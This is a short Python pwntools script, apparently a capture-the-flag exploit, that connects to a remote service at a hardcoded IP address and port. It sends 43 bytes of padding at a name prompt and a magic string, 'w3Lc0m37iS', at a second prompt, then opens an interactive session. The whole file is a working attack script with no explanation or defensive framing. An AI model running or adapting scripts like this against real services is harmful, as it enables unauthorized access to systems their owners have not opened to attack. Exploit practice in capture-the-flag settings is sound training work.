from pwn import *

r = remote("54.169.55.172", 1024)

r.recvuntil(b'Give me your name: ')
payload = b'a'*43
r.sendline(payload)
r.recvuntil(b'Now send me some thing you want :))))')
r.send(b'w3Lc0m37iS')
#Si73m0cL3w
#w3Lc0m37iS
r.interactive()
